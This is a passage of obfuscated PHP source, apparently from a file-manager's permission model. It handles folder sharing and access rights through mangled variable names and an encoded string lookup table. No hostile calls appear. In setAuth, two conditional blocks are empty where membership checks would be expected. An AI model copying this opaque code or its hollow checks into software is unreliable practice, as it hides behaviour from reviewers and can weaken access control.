$­¹öëº[$İ—˜ù¦‘[752]] == $İ—˜ù¦‘[2004]) { $ñú»˜ş™[$İ—˜ù¦‘[752]] = 0; } $í­·º‰ = Model($İ—˜ù¦‘[1999])->where($Æ§†ËÁ¹)->save($ñú»˜ş™); if ($¯½À¡˜§[$İ—˜ù¦‘[752]] == $İ—˜ù¦‘[437]) { if ($­¹öëº[$İ—˜ù¦‘[468]] != $İ—˜ù¦‘[197] && $this->shareFileMeta($­¹öëº[$İ—˜ù¦‘[468]])) { $this->shareFileMeta($­¹öëº[$İ—˜ù¦‘[468]], 0); } $this->remove($­¹öëº[$İ—˜ù¦‘[489]]); return !0; } if ($í­·º‰ && $¯½À¡˜§[$İ—˜ù¦‘[752]] == $İ—˜ù¦‘[2004]) { $ıø¦»¦Û = $ñú»˜ş™[$İ—˜ù¦‘[752]] == $İ—˜ù¦‘[2004] ? 1 : 0; $this->shareFileMeta($­¹öëº[$İ—˜ù¦‘[468]], $ıø¦»¦Û); $this->removeByFile($­¹öëº[$İ—˜ù¦‘[468]]); } return $í­·º‰; } private function removeByFile($Ğ•ÎÑ­¸) { $¸Ã”úÎá =& $_SERVER[ÏéâËõ‘]; $ ±­Å¬Ä = Model($¸Ã”úÎá[827])->where(array($¸Ã”úÎá[468] => $Ğ•ÎÑ­¸))->field($¸Ã”úÎá[402])->select(); $ô­¯ã‡¶ = array_to_keyvalue($ ±­Å¬Ä, $¸Ã”úÎá[12], $¸Ã”úÎá[402]); $‰ÙŒƒë— = array($¸Ã”úÎá[402] => array($¸Ã”úÎá[7], $ô­¯ã‡¶), $¸Ã”úÎá[494] => 1); $ ±­Å¬Ä = $this->where($‰ÙŒƒë—)->field($¸Ã”úÎá[489])->select(); if (empty($ ±­Å¬Ä)) { return; } $ìÌ‡şİ = array_to_keyvalue($ ±­Å¬Ä, $¸Ã”úÎá[12], $¸Ã”úÎá[489]); $this->remove($ìÌ‡şİ); } private function shareFileMeta($°’Ä•, $ÎÁ×±„É = null) { $©‰Öö¥Ä =& $_SERVER[ÏéâËõ‘]; $µ—‚½„ = array($©‰Öö¥Ä[468] => $°’Ä•, $©‰Öö¥Ä[94] => $©‰Öö¥Ä[2009]); if (is_null($ÎÁ×±„É)) { return Model($©‰Öö¥Ä[2010])->where($µ—‚½„)->find(); } $µ—‚½„[$©‰Öö¥Ä[374]] = $ÎÁ×±„É; Model($©‰Öö¥Ä[2010])->add($µ—‚½„, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\x72\x63\145\x5f\141\165\164\150"; public function getAuth($åˆ®´›À) { $Ñ¨À¾ã† =& $_SERVER[ÏéâËõ‘]; $Í†Š‘ñ = $this->sourceAuthSelect($åˆ®´›À); $úÁêÑ®Ë = array(); $…áÀ¨ã = array(); $œ‚«Ïø = 2 << 25; foreach ($Í†Š‘ñ as $ó¾¶ı“Ç) { $ù¡ˆ©õå = Model($Ñ¨À¾ã†[507])->listData($ó¾¶ı“Ç[$Ñ¨À¾ã†[1938]]); if (!$ù¡ˆ©õå) { continue; } $úÁêÑ®Ë[] = $ó¾¶ı“Ç; $İòæ¡ù = 0; if ($ó¾¶ı“Ç[$Ñ¨À¾ã†[411]] == SourceModel::TYPE_GROUP) { $İòæ¡ù = $œ‚«Ïø * 2; } if ($ó¾¶ı“Ç[$Ñ¨À¾ã†[411]] == SourceModel::TYPE_USER) { $İòæ¡ù = $œ‚«Ïø; } if ($ó¾¶ı“Ç[$Ñ¨À¾ã†[411]] == SourceModel::TYPE_USER && $ó¾¶ı“Ç[$Ñ¨À¾ã†[505]] == $Ñ¨À¾ã†[197]) { $İòæ¡ù = 0; } $…áÀ¨ã[] = $ù¡ˆ©õå[$Ñ¨À¾ã†[413]] + $İòæ¡ù; } array_multisort($…áÀ¨ã, SORT_DESC, $úÁêÑ®Ë); return $úÁêÑ®Ë; } public function sourceAuthSelect($ûïÕ¢) { $Íõäï¯ş =& $_SERVER[ÏéâËõ‘]; static $ûèïøÑ© = array(); $éÄ½®ˆ® = is_array($ûïÕ¢) ? !1 : !0; if ($éÄ½®ˆ®) { $ûïÕ¢ = array($ûïÕ¢); } $á‰¤æ«… = array(); foreach ($ûïÕ¢ as $ã—€Ş«³) { if (isset($ûèïøÑ©[$ã—€Ş«³])) { $á‰¤æ«…[$ã—€Ş«³] = $ûèïøÑ©[$ã—€Ş«³]; } } if (count($á‰¤æ«…) == count($ûïÕ¢)) { return $éÄ½®ˆ® ? $á‰¤æ«…[$ûïÕ¢[0]] : $á‰¤æ«…; } $×€ÍÈĞ¬ = $Íõäï¯ş[2011]; $‚ÊßŠ¯Ë = array($Íõäï¯ş[402] => array($Íõäï¯ş[7], $ûïÕ¢)); $·õêÂ§· = $this->field($×€ÍÈĞ¬)->order($Íõäï¯ş[399])->where($‚ÊßŠ¯Ë)->select(); $–»ºÈÎ = array_to_keyvalue_group($·õêÂ§·, $Íõäï¯ş[402]); foreach ($ûïÕ¢ as $ã—€Ş«³) { $ûèïøÑ©[$ã—€Ş«³] = $–»ºÈÎ[$ã—€Ş«³] ? $–»ºÈÎ[$ã—€Ş«³] : array(); } if ($éÄ½®ˆ®) { return $·õêÂ§·; } return $–»ºÈÎ; } public function setAuth($Ûİ“Í«, $Ş‰ŠãØ) { $ßØİùÍÛ =& $_SERVER[ÏéâËõ‘]; $ğĞ•ªĞ  = Model($ßØİùÍÛ[1332])->sourceInfo($Ûİ“Í«); if (!$ğĞ•ªĞ ) { return !1; } if ($ğĞ•ªĞ [$ßØİùÍÛ[411]] != SourceModel::TYPE_GROUP) { return !1; } $Ø·¡´¦¨ = 1; $œºäÖÔ“ = $ğĞ•ªĞ [$ßØİùÍÛ[505]]; if ($œºäÖÔ“ != $Ø·¡´¦¨) { $ì¦§Ìâ° = array($ßØİùÍÛ[1834] => $œºäÖÔ“); $¢¾‘™ù° = Model($ßØİùÍÛ[1924])->field($ßØİùÍÛ[1662])->where($ì¦§Ìâ°)->select(); $¢¾‘™ù° = array_to_keyvalue($¢¾‘™ù°, $ßØİùÍÛ[12], $ßØİùÍÛ[1662]); } $»…ıÛƒä = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ª¨ÑÖ—½ = array(); foreach ($Ş‰ŠãØ as $ƒ·ı‘) { if (!in_array($ƒ·ı‘[$ßØİùÍÛ[411]], $»…ıÛƒä)) { show_json(LNG($ßØİùÍÛ[2012]), !1); } if ($œºäÖÔ“ != $Ø·¡´¦¨) { if ($ƒ·ı‘[$ßØİùÍÛ[411]] == SourceModel::TYPE_GROUP) { } if ($ƒ·ı‘[$ßØİùÍÛ[505]] != 0 && !in_array($ƒ·ı‘[$ßØİùÍÛ[505]], $¢¾‘™ù°)) { } } if ($ƒ·ı‘[$ßØİùÍÛ[505]] == 0) { $ƒ·ı‘[$ßØİùÍÛ[411]] = SourceModel::TYPE_USER; } $ª¨ÑÖ—½[] = array($ßØİùÍÛ[402] => $Ûİ“Í«, $ßØİùÍÛ[411] => intval($ƒ·ı‘[$ßØİùÍÛ[411]]), $ßØİùÍÛ[505] => intval($ƒ·ı‘[$ßØİùÍÛ[505]]), $ßØİùÍÛ[1938] => intval($ƒ·ı‘[$ßØİùÍÛ[1938]]) ? intval($ƒ·ı‘[$ßØİùÍÛ[1938]]) : 0, $ßØİùÍÛ[1994] => intval($ƒ·ı‘[$ßØİùÍÛ[1994]]) ? intval($ƒ·ı‘[$ßØİùÍÛ[1994]]) : -1); } $this->where(array($ßØİùÍÛ[417] => $Ûİ“Í«))->delete(); $this->addAll($ª¨ÑÖ—½); return !0; } public function authClear($©ŠĞûÚ¿) { $˜Á±ƒã =& $_SERVER[ÏéâËõ‘]; $ä¼¥½º¦ = Model($˜Á±ƒã[1332])->sourceInfo($©ŠĞûÚ¿); $ŠóŒ = array($©ŠĞûÚ¿); if ($ä¼¥½º¦[$˜Á±ƒã[410]] == $˜Á±ƒã[88]) { $µîã¾ä‚ = array($˜Á±ƒã[590] => array($˜Á±ƒã[550], $ä¼¥½º¦[$˜Á±ƒã[521]] . $©ŠĞûÚ¿ . $˜Á±ƒã[551])); $ŠóŒ = Model($˜Á±ƒã[1332])->field($˜Á±ƒã[417])->where($µîã¾ä‚)->getField($˜Á±ƒã[402], !0); $ŠóŒ[] = $©ŠĞûÚ¿; } $this->where(array($˜Á±ƒã[417] => array($˜Á±ƒã[418], $ŠóŒ)))->delete(); return !0; } public function getAllChildren($üú¿×Ò) { $·ÃÛ÷Ëƒ =& $_SERVER[ÏéâËõ‘]; $¶áÚŒ¡¾ = Model($·ÃÛ÷Ëƒ[1332])->sourceInfo($üú¿×Ò); if ($¶áÚŒ¡¾[$·ÃÛ÷Ëƒ[410]] != $·ÃÛ÷Ëƒ[88]) { return $this->sourceListAuth(array($üú¿×Ò)); } if ($¶áÚŒ¡¾[$·ÃÛ÷Ëƒ[411]] != SourceModel::TYPE_GROUP) { return array(); } $ö±Âì«Ù = 1; $¾„è´œ™ = array($üú¿×Ò); if ($¶áÚŒ¡¾[$·ÃÛ÷Ëƒ[432]] == $·ÃÛ÷Ëƒ[197] && $¶áÚŒ¡¾[$·ÃÛ÷Ëƒ[505]] != $ö±Âì«Ù) { $¾„è´œ™ = $this->groupChidldAllRootSource($¶áÚŒ¡¾[$·ÃÛ÷Ëƒ[505]]); } $áƒÒåñ¹ = $this->field($·ÃÛ÷Ëƒ[402])->group($·ÃÛ÷Ëƒ[402])->select(); $áƒÒåñ¹ = array_to_keyvalue($áƒÒåñ¹, $·ÃÛ÷Ëƒ[12], $·ÃÛ÷Ëƒ[402]); if (!$áƒÒåñ¹) { return array(); } $ÔœŸ÷Ü = $·ÃÛ÷Ëƒ[2013]; $éĞšÊ«¼ = array($·ÃÛ÷Ëƒ[402] => array($·ÃÛ÷Ëƒ[7], $áƒÒåñ¹), $·ÃÛ÷Ëƒ[431] => $·ÃÛ÷Ëƒ[197]); $üÂÍ‹ô“ = Model($·ÃÛ÷Ëƒ[827])->field($ÔœŸ÷Ü)->where($éĞšÊ«¼)->select(); $úê¸Ò™ = array($üú¿×Ò); foreach ($üÂÍ‹ô“ as $ÈöÚè‚é) { foreach ($¾„è´œ™ as $ô£É½ıñ) { $ÑŞì¾˜« = $·ÃÛ÷Ëƒ[50] . $ô£É½ıñ . $·ÃÛ÷Ëƒ[50]; $ğÏçŒ§Ó = $ÈöÚè‚é[$·ÃÛ÷Ëƒ[521]] . $ÈöÚè‚é[$·ÃÛ÷Ëƒ[402]] . $·ÃÛ÷Ëƒ[50]; if (strstr($ğÏçŒ§Ó, $ÑŞì¾˜«)) { $úê¸Ò™[] = $ÈöÚè‚é[$·ÃÛ÷Ëƒ[402]]; break; } } } return $this->sourceListAuth($úê¸Ò™); } private function sourceListAuth($¡ïşÏºÔ) { $ÂªÓ¢ç® =& $_SERVER[ÏéâËõ‘]; $«…á­ÀÉ = Model($ÂªÓ¢ç®[1332])->sourceListInfo($¡ïşÏºÔ, !0); $‚¢èê˜˜ = $this->sourceAuthSelect($¡ïşÏºÔ); $ô˜’¡ƒä = array(); $ìíìÉêÛ = array(); foreach ($«…á­ÀÉ as $ºåƒğÎË) { unset($ºåƒğÎË[$ÂªÓ¢ç®[456]]); unset($ºåƒğÎË[$ÂªÓ¢ç®[454]]); unset($ºåƒğÎË[$ÂªÓ¢ç®[413]]); unset($ºåƒğÎË[$ÂªÓ¢ç®[86]]); $Ãï’¿Î‹ = $‚¢èê˜˜[$ºåƒğÎË[$ÂªÓ¢ç®[402]]]; if (!$Ãï’¿Î‹) { continue; } $ºåƒğÎË[$ÂªÓ¢ç®[2014]] = $this->authTargetInfo($Ãï’¿Î‹); $ºåƒğÎË[$ÂªÓ¢ç®[519]] = rtrim($ºåƒğÎË[$ÂªÓ¢ç®[525]], $ÂªÓ¢ç®[8]) . $ÂªÓ¢ç®[8] . ltrim($ºåƒğÎË[$ÂªÓ¢ç®[519]], $ÂªÓ¢ç®[8]); $ô˜’¡ƒä[] = $ºåƒğÎË; $ó¦ŒÒ¡ = count(explode($ÂªÓ¢ç®[8], trim($ºåƒğÎË[$ÂªÓ¢ç®[519]], $ÂªÓ¢ç®[8]))); $ìíìÉêÛ[] = $ó¦ŒÒ¡ + ($ºåƒğÎË[$ÂªÓ¢ç®[33]] == $ÂªÓ¢ç®[75] ? 0 : 1000); } array_multisort($ìíìÉêÛ, SORT_ASC, $ô˜’¡ƒä); return $ô˜’¡ƒä; } private function groupChidldAllRootSource($»¼Ëæ…) { $°ÚÆ‰Î =& $_SERVER[ÏéâËõ‘]; $º‹Ğ§ø§ = Model($°ÚÆ‰Î[2015])->groupChildrenAll($»¼Ëæ…); $ªìÍ¯±£ = array($°ÚÆ‰Î[432] => 0, $°ÚÆ‰Î[505] => array($°ÚÆ‰Î[7], $º‹Ğ§ø§), $°ÚÆ‰Î[411] => SourceModel::TYPE_GROUP); $åÈÊÅñ = Model($°ÚÆ‰Î[827])->field($°ÚÆ‰Î[402])->where($ªìÍ¯±£)->select(); $åÈÊÅñ = array_to_keyvalue($åÈÊÅñ, $°ÚÆ‰Î[12], $°ÚÆ‰Î[402]); return $åÈÊÅñ; } private function authTargetInfo($Ç€¶äàû) { $øë¬³“Â =& $_SERVER[ÏéâËõ‘]; $Ü±ÀÜµş = array(); $ÀıÀŠ‹„ = array(); $Ë›Ã«–í = 2 << 25; foreach ($Ç€¶äàû as $µõØçø) { $ÜáÍ¼Ö¢ = Model($øë¬³“Â[507])->listData($µõØçø[$øë¬³“Â[1938]]); if (!$ÜáÍ¼Ö¢) { continue; } if ($µõØçø[$øë¬³“Â[411]] == SourceModel::TYPE_USER) { $È×ğ÷·û = Model($øë¬³“Â[513])->getInfoSimpleOuter($µõØçø[$øë¬³“Â[505]]); if ($È×ğ÷·û[$øë¬³“Â[1662]] == $øë¬³“Â[1195]) { continue; } if ($È×ğ÷·û[$øë¬³“Â[1662]] == $øë¬³“Â[197]) { $È×ğ÷·û[$øë¬³“Â[32]] = LNG($øë¬³“Â[2016]); } } else { $È×ğ÷·û = Model($øë¬³“Â[522])->getInfoSimple($µõØçø[$øë¬³“Â[505]]); } if (!$È×ğ÷·û) { continue; } $È×ğ÷·û[$øë¬³“Â[467]] = $ÜáÍ¼Ö¢; $Ü±ÀÜµş[] = $È×ğ÷·û; $®Õƒ‰ü÷ = 0; if ($µõØçø[$øë¬³“Â[411]] == SourceModel::TYPE_GROUP) { $®Õƒ‰ü÷ = $Ë›Ã«–í * 2; } if ($µõØçø[$øë¬³“Â[411]] == SourceModel::TYPE_USER) { $®Õƒ‰ü÷ = $Ë›Ã«–í; } if ($µõØçø[$øë¬³“Â[411]] == SourceModel::TYPE_USER && $µõØçø[$øë¬³“Â[505]] == $øë¬³“Â[197]) { $®Õƒ‰ü÷ = 0; } $ÀıÀŠ‹„[] = $ÜáÍ¼Ö¢[$øë¬³“Â[413]] + $®Õƒ‰ü÷; } array_multisort($ÀıÀŠ‹„, SORT_DESC, $Ü±ÀÜµş); return $Ü±ÀÜµş; } public function getAllChildrenByUser($îóş¢Üç, $­‡˜Á×Ú) { $Ì«ÕÀş =& $_SERVER[ÏéâËõ‘]; $«àîˆÜ– = Model($Ì«ÕÀş[535])->getInfo($­‡˜Á×Ú); if (!$­‡˜Á×Ú || !$îóş¢Üç || !$«àîˆÜ–) { return array(); } $‹Ş­î§£ = Model($Ì«ÕÀş[1332])->sourceInfo($îóş¢Üç); $ê°¿ıŸé = array(); $½¥…£ú‡ = 1; if ($‹Ş­î§£[$Ì«ÕÀş[432]] == $Ì«ÕÀş[197] && $‹Ş­î§£[$Ì«ÕÀş[505]] != $½¥…£ú‡ && $this->groupContainUser($‹Ş­î§£[$Ì«ÕÀş[505]], $­‡˜Á×Ú)) { foreach ($«àîˆÜ–[$Ì«ÕÀş[2017]] as $ÛÑş†Ù) { $Ñâ¯Úí = Model($Ì«ÕÀş[522])->getInfo($ÛÑş†Ù[$Ì«ÕÀş[1834]]); $Ò‘Å‚›Ã = Model($Ì«ÕÀş[535])->getInfoSimpleOuter($­‡˜Á×Ú); $Ò‘Å‚›Ã[$Ì«ÕÀş[467]] = $ÛÑş†Ù[$Ì«ÕÀş[413]]; if (Model($Ì«ÕÀş[507])->authCheckAction($ÛÑş†Ù[$Ì«ÕÀş[413]][$Ì«ÕÀş[413]], $Ì«ÕÀş[1855])) { continue; } $¦ÅÂ÷Â = array($Ì«ÕÀş[32] => $Ì«ÕÀş[1610] . $Ñâ¯Úí[$Ì«ÕÀş[32]], $Ì«ÕÀş[402] => $Ñâ¯Úí[$Ì«ÕÀş[86]][$Ì«ÕÀş[402]], $Ì«ÕÀş[84] => KodIO::make($Ñâ¯Úí[$Ì«ÕÀş[86]][$Ì«ÕÀş[402]]), $Ì«ÕÀş[432] => $Ì«ÕÀş[197], $Ì«ÕÀş[411] => $Ì«ÕÀş[515], $Ì«ÕÀş[33] => $Ì«ÕÀş[554], $Ì«ÕÀş[519] => $Ñâ¯Úí[$Ì«ÕÀş[526]], $Ì«ÕÀş[1834] => $Ñâ¯Úí[$Ì«ÕÀş[1834]], $Ì«ÕÀş[523] => $Ñâ¯Úí[$Ì«ÕÀş[432]], $Ì«ÕÀş[2014] => array($Ò‘Å‚›Ã)); $ê°¿ıŸé[$¦ÅÂ÷Â[$Ì«ÕÀş[402]]] = $¦ÅÂ÷Â; } } $Îëßå‰í = array(); $Ô÷ ó‡Ñ = $this->getAllChildren($îóş¢Üç); foreach ($Ô÷ ó‡Ñ as $Ãï˜±§) { $²Æ“íç¶ = !1; foreach ($Ãï˜±§[$Ì«ÕÀş[2014]] as $Ø·Îû¯ ) { if ($Ø·Îû¯ [$Ì«ÕÀş[1662]]) { if ($Ø·Îû¯ [$Ì«ÕÀş[1662]] == $­‡˜Á×Ú) { $²Æ“íç¶ = !0; break; } } if ($Ø·Îû¯ [$Ì«ÕÀş[1834]]) { if ($this->groupContainUser($Ø·Îû¯ [$Ì«ÕÀş[1834]], $­‡˜Á×Ú)) { $²Æ“íç¶ = !0; break; } } } if ($²Æ“íç¶) { $Îëßå‰í[] = $Ãï˜±§; } $à¬¨ïÉ½ = $Ãï˜±§[$Ì«ÕÀş[402]]; if (isset($ê°¿ıŸé[$à¬¨ïÉ½])) { $Ãï˜±§[$Ì«ÕÀş[2014]][] = $ê°¿ıŸé[$à¬¨ïÉ½][0]; $ê°¿ıŸé[$à¬¨ïÉ½] = !1; } } $ê°¿ıŸé = array_filter(array_values($ê°¿ıŸé)); $Îëßå‰í = array_merge($ê°¿ıŸé, $Îëßå‰í); return $Îëßå‰í; } public function setAllChildrenByUser($’ïôøİ, $é§Äá, $Æ‰øãÒÏ) { $»â³Û¨÷ =& $_SERVER[ÏéâËõ‘]; $È”çœÓ’ = $this->getAllChildrenByUser($’ïôøİ, $é§Äá); if (!$Æ‰øãÒÏ || !$È”çœÓ’) { return !1; } foreach ($È”çœÓ’ as $şúÑ‹¨Ô) { $·È°”ÒÙ = array(); foreach ($şúÑ‹¨Ô[$»â³Û¨÷[2014]] as $¡†à‚³) { $°×„®á‹ = $¡†à‚³[$»â³Û¨÷[467]]; $ÄÔÜß§„ = $¡†à‚³[$»â³Û¨÷[1662]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ÒÀì¨è = $¡†à‚³[$»â³Û¨÷[1662]] ? $¡†à‚³[$»â³Û¨÷[1662]] : $¡†à‚³[$»â³Û¨÷[1834]]; if ($¡†à‚³[$»â³Û¨÷[1662]] && $¡†à‚³[$»â³Û¨÷[1662]] == $é§Äá) { continue; } $·È°”ÒÙ[] = array($»â³Û¨÷[402] => $şúÑ‹¨Ô[$»â³Û¨÷[402]], $»â³Û¨÷[411] => $ÄÔÜß§„, $»â³Û¨÷[505] => intval($ÒÀì¨è), $»â³Û¨÷[1938] => isset($°×„®á‹[$»â³Û¨÷[399]]) ? intval($°×„®á‹[$»â³Û¨÷[399]]) : 0, $»â³Û¨÷[1994] => isset($°×„®á‹[$»â³Û¨÷[1994]]) ? intval($°×„®á‹[$»â³Û¨÷[1994]]) : -1); } $·È°”ÒÙ[] = array($»â³Û¨÷[402] => $şúÑ‹¨Ô[$»â³Û¨÷[402]], $»â³Û¨÷[411] => SourceModel::TYPE_USER, $»â³Û¨÷[505] => intval($é§Äá), $»â³Û¨÷[1938] => intval($Æ‰øãÒÏ), $»â³Û¨÷[1994] => -1); $this->where(array($»â³Û¨÷[417] => $şúÑ‹¨Ô[$»â³Û¨÷[402]]))->delete(); $this->addAll($·È°”ÒÙ); } return !0; } public function get($äĞÂùšÙ) { $Ï•å’–µ = $this->getSourceList(array($äĞÂùšÙ), !0); return $Ï•å’–µ[0]; } public function getSourceList($Œª¦ë«¥, $·äŠü… = false, $¼ÁÊÆÛ´ = false) { $ùé¢ù÷Ä =& $_SERVER[ÏéâËõ‘]; if (!$Œª¦ë«¥) { return array(); } $ƒ¶Üª¯ç = Model($ùé¢ù÷Ä[1332]); if (!$·äŠü… && count($Œª¦ë«¥) == 1) { $·äŠü… = array(); $·äŠü…[$Œª¦ë«¥[0]] = $ƒ¶Üª¯ç->sourceInfo($Œª¦ë«¥[0]); } if (!$·äŠü…) { $×’§šõº = array($ùé¢ù÷Ä[417] => array($ùé¢ù÷Ä[418], $Œª¦ë«¥)); $·äŠü… = $ƒ¶Üª¯ç->field($ùé¢ù÷Ä[2018])->where($×’§šõº)->select(); $·äŠü… = array_to_keyvalue($·äŠü…, $ùé¢ù÷Ä[402]); } $’Ê‘¡ö« = $Œª¦ë«¥; foreach ($·äŠü… as $ú„Í± => $íÌ¾ù”ö) { $øÌ‡ŸØÔ = $ƒ¶Üª¯ç->parentLevelArray($íÌ¾ù”ö[$ùé¢ù÷Ä[521]]); $’Ê‘¡ö« = array_merge($’Ê‘¡ö«, array($ú„Í±), array_reverse($øÌ‡ŸØÔ)); } $’Ê‘¡ö« = array_values(array_unique($’Ê‘¡ö«)); if (!$’Ê‘¡ö«) { return array(); } $Õ‰’ââ = $this->sourceAuthSelect($’Ê‘¡ö«); $›ÙÇÕ‡Ú = array(); foreach ($’Ê‘¡ö« as $÷³‰¾î) { if (isset($Õ‰’ââ[$÷³‰¾î])) { $›ÙÇÕ‡Ú[$÷³‰¾î] = $Õ‰’ââ[$÷³‰¾î]; } } $ö…“âíø = $this->userIsRoot($¼ÁÊÆÛ´); $‚ “­Îš = AuthModel::authAll(); $ê€ö‡åö = array($ùé¢ù÷Ä[414] => $‚ “­Îš, $ùé¢ù÷Ä[2019] => array($ùé¢ù÷Ä[419] => 0, $ùé¢ù÷Ä[1840] => $‚ “­Îš, $ùé¢ù÷Ä[420] => LNG($ùé¢ù÷Ä[2020]), $ùé¢ù÷Ä[1857] => $ùé¢ù÷Ä[2021])); $ˆş³±· = array(); foreach ($·äŠü… as $÷³‰¾î => $Ñ„ÌÓƒÀ) { if ($ö…“âíø && $GLOBALS[$ùé¢ù÷Ä[6]][$ùé¢ù÷Ä[1853]]) { $ˆş³±·[$÷³‰¾î] = $ê€ö‡åö; continue; } $ˆş³±·[$÷³‰¾î] = $this->makeSourceAuth($Ñ„ÌÓƒÀ, $›ÙÇÕ‡Ú, $¼ÁÊÆÛ´); } return $ˆş³±·; } public function authDeepCheck($Ë–ÓÉš, $ÀÀª…¨ = false) { $Å»à©û‹ =& $_SERVER[ÏéâËõ‘]; $ÀÀª…¨ = $ÀÀª…¨ ? $ÀÀª…¨ : USER_ID; $¥Ÿ èìô = $this->makeAuthDeep($ÀÀª…¨); if (!in_array($Ë–ÓÉš, $¥Ÿ èìô[$Å»à©û‹[2022]])) { return !1; } $ò»Şî¨Å = array(); foreach ($¥Ÿ èìô[$Å»à©û‹[2023]] as $è»ù˜†Å => $”¿¦üš) { if (!in_array($Ë–ÓÉš, $”¿¦üš)) { continue; } $ò»Şî¨Å[] = $è»ù˜†Å; } if (!$ò»Şî¨Å) { return !1; } $¨í¹É¨ = $ò»Şî¨Å ? $ò»Şî¨Å[0] : $Ë–ÓÉš; return array($Å»à©û‹[414] => -1, $Å»à©û‹[467] => array($Å»à©û‹[419] => $Å»à©û‹[1195], $Å»à©û‹[1840] => $Å»à©û‹[197], $Å»à©û‹[420] => LNG($Å»à©û‹[2024]), $Å»à©û‹[1857] => $Å»à©û‹[2025]), $Å»à©û‹[2026] => LNG($Å»à©û‹[2027]), $Å»à©û‹[2028] => $this->sourceAuthInfo($¨í¹É¨)); } protected function makeAuthDeep($æ‹èåú = false) { $ƒå©šÎ =& $_SERVER[ÏéâËõ‘]; static $‚Æ½åÚÈ = array(); $æ‹èåú = $æ‹èåú ? $æ‹èåú : USER_ID; if (isset($‚Æ½åÚÈ[$æ‹èåú])) { return $‚Æ½åÚÈ[$æ‹èåú]; } $Ñ…ØÅóÜ = Model($ƒå©šÎ[2029])->listData(); $ÒÀ±»äÇ = array(); foreach ($Ñ…ØÅóÜ as $«ìÊò•‡) { if ($«ìÊò•‡[$ƒå©šÎ[413]] == 0 && $«ìÊò•‡[$ƒå©šÎ[1856]] == $ƒå©šÎ[88]) { $ÒÀ±»äÇ[] = $«ìÊò•‡[$ƒå©šÎ[399]]; } } $—‰ê‚ÙÆ = $this->userGroupParents($æ‹èåú); $ëÂÙ¾  = array($ƒå©šÎ[411] => SourceModel::TYPE_USER, $ƒå©šÎ[505] => $æ‹èåú); if ($—‰ê‚ÙÆ) { $ëÂÙ¾  = array(array($ƒå©šÎ[411] => SourceModel::TYPE_USER, $ƒå©šÎ[505] => $æ‹èåú), array($ƒå©šÎ[411] => SourceModel::TYPE_GROUP, $ƒå©šÎ[505] => array($ƒå©šÎ[418], $—‰ê‚ÙÆ)), $ƒå©šÎ[1005] => $ƒå©šÎ[1932]); } $üúƒ“«ù = $this->field($ƒå©šÎ[2030])->where($ëÂÙ¾ )->select(); $­‚ÈÅ¸Ÿ = array(); $›¥Œ³ññ = array_to_keyvalue_group($üúƒ“«ù, $ƒå©šÎ[402]); foreach ($›¥Œ³ññ as $Ì¤»Ôƒ => $Ù»«—ïÙ) { $ÀÍ÷Òö° = $this->authArrayCheck($Ù»«—ïÙ, $æ‹èåú); if ($ÀÍ÷Òö°[$ƒå©šÎ[414]] > 0) { $­‚ÈÅ¸Ÿ[] = $Ì¤»Ôƒ . $ƒå©šÎ[12]; } } if ($—‰ê‚ÙÆ) { $§âÅËîú = Model($ƒå©šÎ[522]); foreach ($—‰ê‚ÙÆ as $Øï§”ŠÈ) { $‹ªÑáÑ™ = $§âÅËîú->getInfo($Øï§”ŠÈ); if (!$‹ªÑáÑ™ || !is_array($‹ªÑáÑ™[$ƒå©šÎ[86]])) { continue; } $­‚ÈÅ¸Ÿ[] = $‹ªÑáÑ™[$ƒå©šÎ[86]][$ƒå©šÎ[402]]; } } $Æ§ô§à = array(); $«ä¡åÖ› = $—‰ê‚ÙÆ; $êÛô‰Â¯ = Model($ƒå©šÎ[1332]); $§âÅËîú = Model($ƒå©šÎ[522]); $èŸÇÊù® = array(); $ÕÀ‰–ïÏ = array(); $Ç„ãŞ ¤ = array(); $à÷ÕÜ¾Œ = array(); if ($­‚ÈÅ¸Ÿ) { $¨÷á£‹ = $êÛô‰Â¯->where(array($ƒå©šÎ[402] => array($ƒå©šÎ[418], $­‚ÈÅ¸Ÿ)))->select(); foreach ($¨÷á£‹ as $ÃÛï«İ) { $³Ê˜ß½ = $êÛô‰Â¯->parentLevelArray($ÃÛï«İ[$ƒå©šÎ[521]]); $Æ§ô§à = array_merge($Æ§ô§à, $³Ê˜ß½); $«ä¡åÖ›[] = $ÃÛï«İ[$ƒå©šÎ[505]]; $èŸÇÊù®[$ÃÛï«İ[$ƒå©šÎ[402]]] = $³Ê˜ß½; $ÕÀ‰–ïÏ[$ÃÛï«İ[$ƒå©šÎ[402]]] = $ÃÛï«İ[$ƒå©šÎ[505]]; } } $«ä¡åÖ› = array_values(array_unique($«ä¡åÖ›)); $ÕüÊŸÎü = $«ä¡åÖ›; foreach ($ÕüÊŸÎü as $Øï§”ŠÈ) { $‹ªÑáÑ™ = $§âÅËîú->getInfo($Øï§”ŠÈ); $³Ê˜ß½ = $êÛô‰Â¯->parentLevelArray($‹ªÑáÑ™[$ƒå©šÎ[521]]); $«ä¡åÖ› = array_merge($«ä¡åÖ›, $³Ê˜ß½); } $«ä¡åÖ› = array_values(array_unique($«ä¡åÖ›)); foreach ($«ä¡åÖ› as $Øï§”ŠÈ) { $‹ªÑáÑ™ = $§âÅËîú->getInfo($Øï§”ŠÈ); $Æ§ô§à[] = $‹ªÑáÑ™[$ƒå©šÎ[86]][$ƒå©šÎ[402]]; $Ç„ãŞ ¤[$Øï§”ŠÈ] = $‹ªÑáÑ™[$ƒå©šÎ[86]][$ƒå©šÎ[402]]; $à÷ÕÜ¾Œ[$Øï§”ŠÈ] = $êÛô‰Â¯->parentLevelArray($‹ªÑáÑ™[$ƒå©šÎ[521]]); } foreach ($èŸÇÊù® as $©Ö·–•Ï => $ÈªÒƒ¶¯) { $…Áô‹İà = $ÕÀ‰–ïÏ[$©Ö·–•Ï]; if (!$…Áô‹İà || !$Ç„ãŞ ¤[$…Áô‹İà]) { continue; } $Ç¨…Ã—§ = array(); foreach ($à÷ÕÜ¾Œ[$…Áô‹İà] as $Øï§”ŠÈ) { $Ç¨…Ã—§[] = $Ç„ãŞ ¤[$Øï§”ŠÈ]; } $èŸÇÊù®[$©Ö·–•Ï] = array_merge($Ç¨…Ã—§, $ÈªÒƒ¶¯); } $Æ§ô§à = array_values(array_unique($Æ§ô§à)); $éîñ›÷Ï = array($ƒå©šÎ[2022] => $Æ§ô§à, $ƒå©šÎ[2023] => $èŸÇÊù®); $‚Æ½åÚÈ[$æ‹èåú] = $éîñ›÷Ï; return $éîñ›÷Ï; } private function 